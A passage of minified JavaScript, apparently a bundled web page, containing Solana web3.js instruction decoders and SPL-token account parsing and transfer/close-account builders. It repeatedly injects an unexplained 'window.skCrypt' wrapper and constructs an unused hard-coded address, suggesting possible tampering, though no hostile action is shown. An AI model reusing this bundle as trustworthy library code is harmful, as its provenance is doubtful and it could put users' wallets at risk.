              );
            return n;
          }
          static decodeInitialize(t) {
            this.checkProgramId(t.programId), this.checkKeyLength(t.keys, 2);
            const { authorized: e, lockup: n } = Us(cc.Initialize, t.data);
            return {
              stakePubkey: t.keys[0].pubkey,
              authorized: new ac(new Ji(e.staker), new Ji(e.withdrawer)),
              lockup: new uc(n.unixTimestamp, n.epoch, new Ji(n.custodian)),
            };
          }
          static decodeDelegate(t) {
            return (
              this.checkProgramId(t.programId),
              this.checkKeyLength(t.keys, 6),
              Us(cc.Delegate, t.data),
              {
                stakePubkey: t.keys[0].pubkey,
                votePubkey: t.keys[1].pubkey,
                authorizedPubkey: t.keys[5].pubkey,
              }
            );
          }
          static decodeAuthorize(t) {
            this.checkProgramId(t.programId), this.checkKeyLength(t.keys, 3);
            const { newAuthorized: e, stakeAuthorizationType: n } = Us(
                cc.Authorize,
                t.data
              ),
              r = {
                stakePubkey: t.keys[0].pubkey,
                authorizedPubkey: t.keys[2].pubkey,
                newAuthorizedPubkey: new Ji(e),
                stakeAuthorizationType: { index: n },
              };
            return (
              t.keys.length > 3 && (r.custodianPubkey = t.keys[3].pubkey), r
            );
          }
          static decodeAuthorizeWithSeed(t) {
            this.checkProgramId(t.programId), this.checkKeyLength(t.keys, 2);
            const {
                newAuthorized: e,
                stakeAuthorizationType: n,
                authoritySeed: r,
                authorityOwner: o,
              } = Us(cc.AuthorizeWithSeed, t.data),
              i = {
                stakePubkey: t.keys[0].pubkey,
                authorityBase: t.keys[1].pubkey,
                authoritySeed: r,
                authorityOwner: new Ji(o),
                newAuthorizedPubkey: new Ji(e),
                stakeAuthorizationType: { index: n },
              };
            return (
              t.keys.length > 3 && (i.custodianPubkey = t.keys[3].pubkey), i
            );
          }
          static decodeSplit(t) {
            this.checkProgramId(t.programId), this.checkKeyLength(t.keys, 3);
            const { lamports: e } = Us(cc.Split, t.data);
            return {
              stakePubkey: t.keys[0].pubkey,
              splitStakePubkey: t.keys[1].pubkey,
              authorizedPubkey: t.keys[2].pubkey,
              lamports: e,
            };
          }
          static decodeMerge(t) {
            return (
              this.checkProgramId(t.programId),
              this.checkKeyLength(t.keys, 3),
              Us(cc.Merge, t.data),
              {
                stakePubkey: t.keys[0].pubkey,
                sourceStakePubKey: t.keys[1].pubkey,
                authorizedPubkey: t.keys[4].pubkey,
              }
            );
          }
          static decodeWithdraw(t) {
            this.checkProgramId(t.programId), this.checkKeyLength(t.keys, 5);
            const { lamports: e } = Us(cc.Withdraw, t.data),
              n = {
                stakePubkey: t.keys[0].pubkey,
                toPubkey: t.keys[1].pubkey,
                authorizedPubkey: t.keys[4].pubkey,
                lamports: e,
              };
            return (
              t.keys.length > 5 && (n.custodianPubkey = t.keys[5].pubkey), n
            );
          }
          static decodeDeactivate(t) {
            return (
              this.checkProgramId(t.programId),
              this.checkKeyLength(t.keys, 3),
              Us(cc.Deactivate, t.data),
              {
                stakePubkey: t.keys[0].pubkey,
                authorizedPubkey: t.keys[2].pubkey,
              }
            );
          }
          static checkProgramId(t) {
            if (!t.equals(dc.programId))
              throw new Error(
                "invalid instruction; programId is not StakeProgram"
              );
          }
          static checkKeyLength(t, e) {
            if (t.length < e)
              throw new Error(
                `invalid instruction; found ${t.length} keys, expected at least ${e}`
              );
          }
        },
        StakeProgram: dc,
        Struct: Gi,
        SystemInstruction: class {
          constructor() {}
          static decodeInstructionType(t) {
            this.checkProgramId(t.programId);
            const e = Er.u32("instruction").decode(t.data);
            let n;
            for (const [r, o] of Object.entries(js))
              if (o.index == e) {
                n = r;
                break;
              }
            if (!n)
              throw new Error(
                "Instruction type incorrect; not a SystemInstruction"
              );
            return n;
          }
          static decodeCreateAccount(t) {
            this.checkProgramId(t.programId), this.checkKeyLength(t.keys, 2);
            const {
              lamports: e,
              space: n,
              programId: r,
            } = Us(js.Create, t.data);
            return {
              fromPubkey: t.keys[0].pubkey,
              newAccountPubkey: t.keys[1].pubkey,
              lamports: e,
              space: n,
              programId: new Ji(r),
            };
          }
          static decodeTransfer(t) {
            this.checkProgramId(t.programId), this.checkKeyLength(t.keys, 2);
            const { lamports: e } = Us(js.Transfer, t.data);
            return {
              fromPubkey: t.keys[0].pubkey,
              toPubkey: t.keys[1].pubkey,
              lamports: e,
            };
          }
          static decodeTransferWithSeed(t) {
            this.checkProgramId(t.programId), this.checkKeyLength(t.keys, 3);
            const {
              lamports: e,
              seed: n,
              programId: r,
            } = Us(js.TransferWithSeed, t.data);
            return {
              fromPubkey: t.keys[0].pubkey,
              basePubkey: t.keys[1].pubkey,
              toPubkey: t.keys[2].pubkey,
              lamports: e,
              seed: n,
              programId: new Ji(r),
            };
          }
          static decodeAllocate(t) {
            this.checkProgramId(t.programId), this.checkKeyLength(t.keys, 1);
            const { space: e } = Us(js.Allocate, t.data);
            return { accountPubkey: t.keys[0].pubkey, space: e };
          }
          static decodeAllocateWithSeed(t) {
            this.checkProgramId(t.programId), this.checkKeyLength(t.keys, 1);
            const {
              base: e,
              seed: n,
              space: r,
              programId: o,
            } = Us(js.AllocateWithSeed, t.data);
            return {
              accountPubkey: t.keys[0].pubkey,
              basePubkey: new Ji(e),
              seed: n,
              space: r,
              programId: new Ji(o),
            };
          }
          static decodeAssign(t) {
            this.checkProgramId(t.programId), this.checkKeyLength(t.keys, 1);
            const { programId: e } = Us(js.Assign, t.data);
            return { accountPubkey: t.keys[0].pubkey, programId: new Ji(e) };
          }
          static decodeAssignWithSeed(t) {
            this.checkProgramId(t.programId), this.checkKeyLength(t.keys, 1);
            const {
              base: e,
              seed: n,
              programId: r,
            } = Us(js.AssignWithSeed, t.data);
            return {
              accountPubkey: t.keys[0].pubkey,
              basePubkey: new Ji(e),
              seed: n,
              programId: new Ji(r),
            };
          }
          static decodeCreateWithSeed(t) {
            this.checkProgramId(t.programId), this.checkKeyLength(t.keys, 2);
            const {
              base: e,
              seed: n,
              lamports: r,
              space: o,
              programId: i,
            } = Us(js.CreateWithSeed, t.data);
            return {
              fromPubkey: t.keys[0].pubkey,
              newAccountPubkey: t.keys[1].pubkey,
              basePubkey: new Ji(e),
              seed: n,
              lamports: r,
              space: o,
              programId: new Ji(i),
            };
          }
          static decodeNonceInitialize(t) {
            this.checkProgramId(t.programId), this.checkKeyLength(t.keys, 3);
            const { authorized: e } = Us(js.InitializeNonceAccount, t.data);
            return {
              noncePubkey: t.keys[0].pubkey,
              authorizedPubkey: new Ji(e),
            };
          }
          static decodeNonceAdvance(t) {
            return (
              this.checkProgramId(t.programId),
              this.checkKeyLength(t.keys, 3),
              Us(js.AdvanceNonceAccount, t.data),
              {
                noncePubkey: t.keys[0].pubkey,
                authorizedPubkey: t.keys[2].pubkey,
              }
            );
          }
          static decodeNonceWithdraw(t) {
            this.checkProgramId(t.programId), this.checkKeyLength(t.keys, 5);
            const { lamports: e } = Us(js.WithdrawNonceAccount, t.data);
            return {
              noncePubkey: t.keys[0].pubkey,
              toPubkey: t.keys[1].pubkey,
              authorizedPubkey: t.keys[4].pubkey,
              lamports: e,
            };
          }
          static decodeNonceAuthorize(t) {
            this.checkProgramId(t.programId), this.checkKeyLength(t.keys, 2);
            const { authorized: e } = Us(js.AuthorizeNonceAccount, t.data);
            return {
              noncePubkey: t.keys[0].pubkey,
              authorizedPubkey: t.keys[1].pubkey,
              newAuthorizedPubkey: new Ji(e),
            };
          }
          static checkProgramId(t) {
            if (!t.equals(Gs.programId))
              throw new Error(
                "invalid instruction; programId is not SystemProgram"
              );
          }
          static checkKeyLength(t, e) {
            if (t.length < e)
              throw new Error(
                `invalid instruction; found ${t.length} keys, expected at least ${e}`
              );
          }
        },
        SystemProgram: Gs,
        Transaction: As,
        TransactionExpiredBlockheightExceededError: ts,
        TransactionExpiredNonceInvalidError: ns,
        TransactionExpiredTimeoutError: es,
        TransactionInstruction: vs,
        TransactionMessage: ks,
        TransactionStatus: ws,
        VALIDATOR_INFO_KEY: gc,
        VERSION_PREFIX_MASK: $i,
        VOTE_PROGRAM_ID: bc,
        ValidatorInfo: wc,
        VersionedMessage: ys,
        VersionedTransaction: Is,
        VoteAccount: Ac,
        VoteAuthorizationLayout: pc,
        VoteInit: fc,
        VoteInstruction: class {
          constructor() {}
          static decodeInstructionType(t) {
            this.checkProgramId(t.programId);
            const e = Er.u32("instruction").decode(t.data);
            let n;
            for (const [r, o] of Object.entries(hc))
              if (o.index == e) {
                n = r;
                break;
              }
            if (!n)
              throw new Error(
                "Instruction type incorrect; not a VoteInstruction"
              );
            return n;
          }
          static decodeInitializeAccount(t) {
            this.checkProgramId(t.programId), this.checkKeyLength(t.keys, 4);
            const { voteInit: e } = Us(hc.InitializeAccount, t.data);
            return {
              votePubkey: t.keys[0].pubkey,
              nodePubkey: t.keys[3].pubkey,
              voteInit: new fc(
                new Ji(e.nodePubkey),
                new Ji(e.authorizedVoter),
                new Ji(e.authorizedWithdrawer),
                e.commission
              ),
            };
          }
          static decodeAuthorize(t) {
            this.checkProgramId(t.programId), this.checkKeyLength(t.keys, 3);
            const { newAuthorized: e, voteAuthorizationType: n } = Us(
              hc.Authorize,
              t.data
            );
            return {
              votePubkey: t.keys[0].pubkey,
              authorizedPubkey: t.keys[2].pubkey,
              newAuthorizedPubkey: new Ji(e),
              voteAuthorizationType: { index: n },
            };
          }
          static decodeAuthorizeWithSeed(t) {
            this.checkProgramId(t.programId), this.checkKeyLength(t.keys, 3);
            const {
              voteAuthorizeWithSeedArgs: {
                currentAuthorityDerivedKeyOwnerPubkey: e,
                currentAuthorityDerivedKeySeed: n,
                newAuthorized: r,
                voteAuthorizationType: o,
              },
            } = Us(hc.AuthorizeWithSeed, t.data);
            return {
              currentAuthorityDerivedKeyBasePubkey: t.keys[2].pubkey,
              currentAuthorityDerivedKeyOwnerPubkey: new Ji(e),
              currentAuthorityDerivedKeySeed: n,
              newAuthorizedPubkey: new Ji(r),
              voteAuthorizationType: { index: o },
              votePubkey: t.keys[0].pubkey,
            };
          }
          static decodeWithdraw(t) {
            this.checkProgramId(t.programId), this.checkKeyLength(t.keys, 3);
            const { lamports: e } = Us(hc.Withdraw, t.data);
            return {
              votePubkey: t.keys[0].pubkey,
              authorizedWithdrawerPubkey: t.keys[2].pubkey,
              lamports: e,
              toPubkey: t.keys[1].pubkey,
            };
          }
          static checkProgramId(t) {
            if (!t.equals(mc.programId))
              throw new Error(
                "invalid instruction; programId is not VoteProgram"
              );
          }
          static checkKeyLength(t, e) {
            if (t.length < e)
              throw new Error(
                `invalid instruction; found ${t.length} keys, expected at least ${e}`
              );
          }
        },
        VoteProgram: mc,
        clusterApiUrl: function (t, e) {
          const n = !1 === e ? "http" : "https";
          if (!t) return _c[n].devnet;
          const r = _c[n][t];
          if (!r) throw new Error(`Unknown ${n} cluster: ${t}`);
          return r;
        },
        sendAndConfirmRawTransaction: async function (t, e, n, r) {
          let o, i;
          (n &&
            Object.prototype.hasOwnProperty.call(n, "lastValidBlockHeight")) ||
          (n && Object.prototype.hasOwnProperty.call(n, "nonceValue"))
            ? ((o = n), (i = r))
            : (i = n);
          const s = i && {
              skipPreflight: i.skipPreflight,
              preflightCommitment: i.preflightCommitment || i.commitment,
              minContextSlot: i.minContextSlot,
            },
            a = await t.sendRawTransaction(e, s),
            u = i && i.commitment,
            c = o ? t.confirmTransaction(o, u) : t.confirmTransaction(a, u),
            l = (await c).value;
          if (l.err) {
            if (null != a)
              throw new Rs({
                action: (null == s ? void 0 : s.skipPreflight)
                  ? "send"
                  : "simulate",
                signature: a,
                transactionMessage: `Status: (${JSON.stringify(l)})`,
              });
            throw new Error(
              `Raw transaction ${a} failed (${JSON.stringify(l)})`
            );
          }
          return a;
        },
        sendAndConfirmTransaction: Ls,
      },
      Symbol.toStringTag,
      { value: "Module" }
    )
  );
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const Bc = new Ji("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
    Cc = new Ji("TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb"),
    Ec = new Ji("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL"),
    xc = new Ji("So11111111111111111111111111111111111111112");
  new Ji("9pan9bMn5HatX4EJdBwg9VgCa7Uz5HL8N1m5D3NdXejP");
  const Pc = (t) => ({ decode: t.decode.bind(t), encode: t.encode.bind(t) });
  var Oc,
    Rc = {};
  var Mc =
    (Oc ||
      ((Oc = 1),
      (window.skCrypt = function (t) {
        return function () {
          return t;
        };
      }),
      Object.defineProperty(Rc, "__esModule", { value: !0 }),
      (Rc.toBigIntLE = function (t) {
        {
          const e = dt.from(t);
          e.reverse();
          const n = e.toString("hex");
          return 0 === n.length ? BigInt(0) : BigInt(`0x${n}`);
        }
      }),
      (Rc.toBigIntBE = function (t) {
        {
          const e = t.toString("hex");
          return 0 === e.length ? BigInt(0) : BigInt(`0x${e}`);
        }
      }),
      (Rc.toBufferLE = function (t, e) {
        {
          const n = t.toString(16),
            r = dt.from(n.padStart(2 * e, "0").slice(0, 2 * e), "hex");
          return r.reverse(), r;
        }
      }),
      (Rc.toBufferBE = function (t, e) {
        {
          const n = t.toString(16);
          return dt.from(n.padStart(2 * e, "0").slice(0, 2 * e), "hex");
        }
      })),
    Rc);
  const Lc =
    ((Nc = 8),
    (t) => {
      const e = Er.blob(Nc, t),
        { encode: n, decode: r } = Pc(e),
        o = e;
      return (
        (o.decode = (t, e) => {
          const n = r(t, e);
          return Mc.toBigIntLE(dt.from(n));
        }),
        (o.encode = (t, e, r) => {
          const o = Mc.toBufferLE(t, Nc);
          return n(o, e, r);
        }),
        o
      );
    });
  var Nc;
  const Dc = (t) => {
      const e = Er.u8(t),
        { encode: n, decode: r } = Pc(e),
        o = e;
      return (
        (o.decode = (t, e) => !!r(t, e)),
        (o.encode = (t, e, r) => {
          const o = Number(t);
          return n(o, e, r);
        }),
        o
      );
    },
    Uc = (t) => {
      const e = Er.blob(32, t),
        { encode: n, decode: r } = Pc(e),
        o = e;
      return (
        (o.decode = (t, e) => {
          const n = r(t, e);
          return new Ji(n);
        }),
        (o.encode = (t, e, r) => {
          const o = t.toBuffer();
          return n(o, e, r);
        }),
        o
      );
    };
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  class qc extends Error {
    constructor(t) {
      super(t);
    }
  }
  class zc extends qc {
    constructor() {
      super(...arguments), (this.name = "TokenAccountNotFoundError");
    }
  }
  class Kc extends qc {
    constructor() {
      super(...arguments), (this.name = "TokenInvalidAccountError");
    }
  }
  class Wc extends qc {
    constructor() {
      super(...arguments), (this.name = "TokenInvalidAccountOwnerError");
    }
  }
  class Fc extends qc {
    constructor() {
      super(...arguments), (this.name = "TokenInvalidAccountSizeError");
    }
  }
  class jc extends qc {
    constructor() {
      super(...arguments), (this.name = "TokenInvalidMintError");
    }
  }
  class Gc extends qc {
    constructor() {
      super(...arguments), (this.name = "TokenOwnerOffCurveError");
    }
  }
  var Vc, Hc, Zc, Xc;
  (window.skCrypt = function (t) {
    return function () {
      return t;
    };
  }),
    ((Hc = Vc || (Vc = {}))[(Hc.InitializeMint = 0)] = "InitializeMint"),
    (Hc[(Hc.InitializeAccount = 1)] = "InitializeAccount"),
    (Hc[(Hc.InitializeMultisig = 2)] = "InitializeMultisig"),
    (Hc[(Hc.Transfer = 3)] = "Transfer"),
    (Hc[(Hc.Approve = 4)] = "Approve"),
    (Hc[(Hc.Revoke = 5)] = "Revoke"),
    (Hc[(Hc.SetAuthority = 6)] = "SetAuthority"),
    (Hc[(Hc.MintTo = 7)] = "MintTo"),
    (Hc[(Hc.Burn = 8)] = "Burn"),
    (Hc[(Hc.CloseAccount = 9)] = "CloseAccount"),
    (Hc[(Hc.FreezeAccount = 10)] = "FreezeAccount"),
    (Hc[(Hc.ThawAccount = 11)] = "ThawAccount"),
    (Hc[(Hc.TransferChecked = 12)] = "TransferChecked"),
    (Hc[(Hc.ApproveChecked = 13)] = "ApproveChecked"),
    (Hc[(Hc.MintToChecked = 14)] = "MintToChecked"),
    (Hc[(Hc.BurnChecked = 15)] = "BurnChecked"),
    (Hc[(Hc.InitializeAccount2 = 16)] = "InitializeAccount2"),
    (Hc[(Hc.SyncNative = 17)] = "SyncNative"),
    (Hc[(Hc.InitializeAccount3 = 18)] = "InitializeAccount3"),
    (Hc[(Hc.InitializeMultisig2 = 19)] = "InitializeMultisig2"),
    (Hc[(Hc.InitializeMint2 = 20)] = "InitializeMint2"),
    (Hc[(Hc.GetAccountDataSize = 21)] = "GetAccountDataSize"),
    (Hc[(Hc.InitializeImmutableOwner = 22)] = "InitializeImmutableOwner"),
    (Hc[(Hc.AmountToUiAmount = 23)] = "AmountToUiAmount"),
    (Hc[(Hc.UiAmountToAmount = 24)] = "UiAmountToAmount"),
    (Hc[(Hc.InitializeMintCloseAuthority = 25)] =
      "InitializeMintCloseAuthority"),
    (Hc[(Hc.TransferFeeExtension = 26)] = "TransferFeeExtension"),
    (Hc[(Hc.ConfidentialTransferExtension = 27)] =
      "ConfidentialTransferExtension"),
    (Hc[(Hc.DefaultAccountStateExtension = 28)] =
      "DefaultAccountStateExtension"),
    (Hc[(Hc.Reallocate = 29)] = "Reallocate"),
    (Hc[(Hc.MemoTransferExtension = 30)] = "MemoTransferExtension"),
    (Hc[(Hc.CreateNativeMint = 31)] = "CreateNativeMint"),
    (Hc[(Hc.InitializeNonTransferableMint = 32)] =
      "InitializeNonTransferableMint"),
    (Hc[(Hc.InterestBearingMintExtension = 33)] =
      "InterestBearingMintExtension"),
    (Hc[(Hc.CpiGuardExtension = 34)] = "CpiGuardExtension"),
    (Hc[(Hc.InitializePermanentDelegate = 35)] = "InitializePermanentDelegate"),
    (Hc[(Hc.TransferHookExtension = 36)] = "TransferHookExtension"),
    (Hc[(Hc.MetadataPointerExtension = 39)] = "MetadataPointerExtension"),
    (Hc[(Hc.GroupPointerExtension = 40)] = "GroupPointerExtension"),
    (Hc[(Hc.GroupMemberPointerExtension = 41)] = "GroupMemberPointerExtension"),
    (Hc[(Hc.ScaledUiAmountExtension = 43)] = "ScaledUiAmountExtension"),
    (Hc[(Hc.PausableExtension = 44)] = "PausableExtension"),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    }),
    ((Xc = Zc || (Zc = {}))[(Xc.Uninitialized = 0)] = "Uninitialized"),
    (Xc[(Xc.Mint = 1)] = "Mint"),
    (Xc[(Xc.Account = 2)] = "Account");
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const Jc = Er.struct([
    Er.u8("m"),
    Er.u8("n"),
    Dc("isInitialized"),
    Uc("signer1"),
    Uc("signer2"),
    Uc("signer3"),
    Uc("signer4"),
    Uc("signer5"),
    Uc("signer6"),
    Uc("signer7"),
    Uc("signer8"),
    Uc("signer9"),
    Uc("signer10"),
    Uc("signer11"),
  ]).span;
  var Yc, Qc;
  (window.skCrypt = function (t) {
    return function () {
      return t;
    };
  }),
    ((Qc = Yc || (Yc = {}))[(Qc.Uninitialized = 0)] = "Uninitialized"),
    (Qc[(Qc.Initialized = 1)] = "Initialized"),
    (Qc[(Qc.Frozen = 2)] = "Frozen");
  const $c = Er.struct([
      Uc("mint"),
      Uc("owner"),
      Lc("amount"),
      Er.u32("delegateOption"),
      Uc("delegate"),
      Er.u8("state"),
      Er.u32("isNativeOption"),
      Lc("isNative"),
      Lc("delegatedAmount"),
      Er.u32("closeAuthorityOption"),
      Uc("closeAuthority"),
    ]),
    tl = $c.span;
  async function el(t, e, n, r = Bc) {
    return (function (t, e, n = Bc) {
      if (!e) throw new zc();
      if (!e.owner.equals(n)) throw new Wc();
      if (e.data.length < tl) throw new Fc();
      const r = $c.decode(e.data.slice(0, tl));
      let o = dt.alloc(0);
      if (e.data.length > tl) {
        if (e.data.length === Jc) throw new Fc();
        if (e.data[tl] != Zc.Account) throw new Kc();
        o = e.data.slice(tl + 1);
      }
      return {
        address: t,
        mint: r.mint,
        owner: r.owner,
        amount: r.amount,
        delegate: r.delegateOption ? r.delegate : null,
        delegatedAmount: r.delegatedAmount,
        isInitialized: r.state !== Yc.Uninitialized,
        isFrozen: r.state === Yc.Frozen,
        isNative: !!r.isNativeOption,
        rentExemptReserve: r.isNativeOption ? r.isNative : null,
        closeAuthority: r.closeAuthorityOption ? r.closeAuthority : null,
        tlvData: o,
      };
    })(e, await t.getAccountInfo(e, n), r);
  }
  function nl(t, e, n) {
    if (n.length) {
      t.push({ pubkey: e, isSigner: !1, isWritable: !1 });
      for (const e of n)
        t.push({
          pubkey: e instanceof Ji ? e : e.publicKey,
          isSigner: !0,
          isWritable: !1,
        });
    } else t.push({ pubkey: e, isSigner: !0, isWritable: !1 });
    return t;
  }
  (window.skCrypt = function (t) {
    return function () {
      return t;
    };
  }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  function rl(t) {
    return Er.struct(
      [Lc("epoch"), Lc("maximumFee"), Er.u16("transferFeeBasisPoints")],
      t
    );
  }
  BigInt(1e4);
  const ol = Er.struct([
    Uc("transferFeeConfigAuthority"),
    Uc("withdrawWithheldAuthority"),
    Lc("withheldAmount"),
    rl("olderTransferFee"),
    rl("newerTransferFee"),
  ]);
  ol.span;
  function il(t) {
    const e = (function (t, e) {
      let n = 0;
      for (; ll(n) <= e.length; ) {
        const r = e.readUInt16LE(n),
          o = e.readUInt16LE(n + ul),
          i = ll(n);
        if (r == t) return e.slice(i, i + o);
        n = i + o;
      }
      return null;
    })(sl.TransferFeeConfig, t.tlvData);
    return null !== e ? ol.decode(e) : null;
  }
  var sl, al;
  Er.struct([Lc("withheldAmount")]).span,
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    }),
    ((al = sl || (sl = {}))[(al.Uninitialized = 0)] = "Uninitialized"),
    (al[(al.TransferFeeConfig = 1)] = "TransferFeeConfig"),
    (al[(al.TransferFeeAmount = 2)] = "TransferFeeAmount"),
    (al[(al.MintCloseAuthority = 3)] = "MintCloseAuthority"),
    (al[(al.ConfidentialTransferMint = 4)] = "ConfidentialTransferMint"),
    (al[(al.ConfidentialTransferAccount = 5)] = "ConfidentialTransferAccount"),
    (al[(al.DefaultAccountState = 6)] = "DefaultAccountState"),
    (al[(al.ImmutableOwner = 7)] = "ImmutableOwner"),
    (al[(al.MemoTransfer = 8)] = "MemoTransfer"),
    (al[(al.NonTransferable = 9)] = "NonTransferable"),
    (al[(al.InterestBearingConfig = 10)] = "InterestBearingConfig"),
    (al[(al.CpiGuard = 11)] = "CpiGuard"),
    (al[(al.PermanentDelegate = 12)] = "PermanentDelegate"),
    (al[(al.NonTransferableAccount = 13)] = "NonTransferableAccount"),
    (al[(al.TransferHook = 14)] = "TransferHook"),
    (al[(al.TransferHookAccount = 15)] = "TransferHookAccount"),
    (al[(al.MetadataPointer = 18)] = "MetadataPointer"),
    (al[(al.TokenMetadata = 19)] = "TokenMetadata"),
    (al[(al.GroupPointer = 20)] = "GroupPointer"),
    (al[(al.TokenGroup = 21)] = "TokenGroup"),
    (al[(al.GroupMemberPointer = 22)] = "GroupMemberPointer"),
    (al[(al.TokenGroupMember = 23)] = "TokenGroupMember"),
    (al[(al.ScaledUiAmountConfig = 25)] = "ScaledUiAmountConfig"),
    (al[(al.PausableConfig = 26)] = "PausableConfig"),
    (al[(al.PausableAccount = 27)] = "PausableAccount");
  const ul = 2,
    cl = 2;
  function ll(t) {
    return t + ul + cl;
  }
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const dl = Er.struct([
      Er.u32("mintAuthorityOption"),
      Uc("mintAuthority"),
      Lc("supply"),
      Er.u8("decimals"),
      Dc("isInitialized"),
      Er.u32("freezeAuthorityOption"),
      Uc("freezeAuthority"),
    ]),
    fl = dl.span;
  function hl(t, e, n = Bc) {
    if (!e) throw new zc();
    if (!e.owner.equals(n)) throw new Wc();
    if (e.data.length < fl) throw new Fc();
    const r = dl.decode(e.data.slice(0, fl));
    let o = dt.alloc(0);
    if (e.data.length > fl) {
      if (e.data.length <= tl) throw new Fc();
      if (e.data.length === Jc) throw new Fc();
      if (e.data[tl] != Zc.Mint) throw new jc();
      o = e.data.slice(tl + 1);
    }
    return {
      address: t,
      mintAuthority: r.mintAuthorityOption ? r.mintAuthority : null,
      supply: r.supply,
      decimals: r.decimals,
      isInitialized: r.isInitialized,
      freezeAuthority: r.freezeAuthorityOption ? r.freezeAuthority : null,
      tlvData: o,
    };
  }
  async function pl(t, e, n = !1, r = Bc, o = Ec) {
    if (!n && !Ji.isOnCurve(e.toBuffer())) throw new Gc();
    const [i] = await Ji.findProgramAddress(
      [e.toBuffer(), r.toBuffer(), t.toBuffer()],
      o
    );
    return i;
  }
  function ml(t, e, n = !1, r = Bc, o = Ec) {
    if (!n && !Ji.isOnCurve(e.toBuffer())) throw new Gc();
    const [i] = Ji.findProgramAddressSync(
      [e.toBuffer(), r.toBuffer(), t.toBuffer()],
      o
    );
    return i;
  }
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const gl = Er.struct([Er.u8("instruction")]);
  function yl(t, e, n, r = [], o = Bc) {
    const i = nl(
        [
          { pubkey: t, isSigner: !1, isWritable: !0 },
          { pubkey: e, isSigner: !1, isWritable: !0 },
        ],
        n,
        r
      ),
      s = dt.alloc(gl.span);
    return (
      gl.encode({ instruction: Vc.CloseAccount }, s),
      new vs({ keys: i, programId: o, data: s })
    );
  }
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const wl = Er.struct([Er.u8("instruction")]);
  function bl(t, e, n, r = Bc) {
    const o = [
        { pubkey: t, isSigner: !1, isWritable: !0 },
        { pubkey: e, isSigner: !1, isWritable: !1 },
        { pubkey: n, isSigner: !1, isWritable: !1 },
        { pubkey: Cs, isSigner: !1, isWritable: !1 },
      ],
      i = dt.alloc(wl.span);
    return (
      wl.encode({ instruction: Vc.InitializeAccount }, i),
      new vs({ keys: o, programId: r, data: i })
    );
  }
  function vl(t, e, n, r, o = Bc, i = Ec) {
    return kl(t, e, n, r, dt.alloc(0), o, i);
  }
  function Al(t, e, n, r, o = Bc, i = Ec) {
    return kl(t, e, n, r, dt.from([1]), o, i);
  }
  function kl(t, e, n, r, o, i = Bc, s = Ec) {
    const a = [
      { pubkey: t, isSigner: !0, isWritable: !0 },
      { pubkey: e, isSigner: !1, isWritable: !0 },
      { pubkey: n, isSigner: !1, isWritable: !1 },
      { pubkey: r, isSigner: !1, isWritable: !1 },
      { pubkey: Gs.programId, isSigner: !1, isWritable: !1 },
      { pubkey: i, isSigner: !1, isWritable: !1 },
    ];
    return new vs({ keys: a, programId: s, data: o });
  }
  (window.skCrypt = function (t) {
    return function () {
      return t;
    };
  }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  const Il = Er.struct([Er.u8("instruction")]);
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const Sl = Er.struct([Er.u8("instruction"), Lc("amount")]);
  function _l(t, e, n, r, o = [], i = Bc) {
    const s = nl(
        [
          { pubkey: t, isSigner: !1, isWritable: !0 },
          { pubkey: e, isSigner: !1, isWritable: !0 },
        ],
        n,
        o
      ),
      a = dt.alloc(Sl.span);
    return (
      Sl.encode({ instruction: Vc.Transfer, amount: BigInt(r) }, a),
      new vs({ keys: s, programId: i, data: a })
    );
  }
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const Tl = globalThis || self;
  var Bl, Cl, El, xl;
  var Pl = (function () {
    if (xl) return El;
    (xl = 1),
      (window.skCrypt = function (t) {
        return function () {
          return t;
        };
      });
    var t = (function () {
      if (Cl) return Bl;
      (Cl = 1),
        (window.skCrypt = function (t) {
          return function () {
            return t;
          };
        });
      var t = or().Buffer;
      return (
        (Bl = function (e) {
          if (e.length >= 255) throw new TypeError("Alphabet too long");
          for (var n = new Uint8Array(256), r = 0; r < n.length; r++)
            n[r] = 255;
          for (var o = 0; o < e.length; o++) {
            var i = e.charAt(o),
              s = i.charCodeAt(0);
            if (255 !== n[s]) throw new TypeError(i + " is ambiguous");
            n[s] = o;
          }
          var a = e.length,
            u = e.charAt(0),
            c = Math.log(a) / Math.log(256),
            l = Math.log(256) / Math.log(a);
          function d(e) {
            if ("string" != typeof e) throw new TypeError("Expected String");
            if (0 === e.length) return t.alloc(0);
            for (var r = 0, o = 0, i = 0; e[r] === u; ) o++, r++;
            for (
              var s = ((e.length - r) * c + 1) >>> 0, l = new Uint8Array(s);
              r < e.length;

            ) {
              var d = e.charCodeAt(r);
              if (d > 255) return;
              var f = n[d];
              if (255 === f) return;
              for (
                var h = 0, p = s - 1;
                (0 !== f || h < i) && -1 !== p;
                p--, h++
              )
                (f += (a * l[p]) >>> 0),
                  (l[p] = f % 256 >>> 0),
                  (f = (f / 256) >>> 0);
              if (0 !== f) throw new Error("Non-zero carry");
              (i = h), r++;
            }
            for (var m = s - i; m !== s && 0 === l[m]; ) m++;
            var g = t.allocUnsafe(o + (s - m));
            g.fill(0, 0, o);
            for (var y = o; m !== s; ) g[y++] = l[m++];
            return g;
          }
          return {
            encode: function (n) {
              if (
                ((Array.isArray(n) || n instanceof Uint8Array) &&
                  (n = t.from(n)),
                !t.isBuffer(n))
              )
                throw new TypeError("Expected Buffer");
              if (0 === n.length) return "";
              for (
                var r = 0, o = 0, i = 0, s = n.length;
                i !== s && 0 === n[i];

              )
                i++, r++;
              for (
                var c = ((s - i) * l + 1) >>> 0, d = new Uint8Array(c);
                i !== s;

              ) {
                for (
                  var f = n[i], h = 0, p = c - 1;
                  (0 !== f || h < o) && -1 !== p;
                  p--, h++
                )
                  (f += (256 * d[p]) >>> 0),
                    (d[p] = f % a >>> 0),
                    (f = (f / a) >>> 0);
                if (0 !== f) throw new Error("Non-zero carry");
                (o = h), i++;
              }
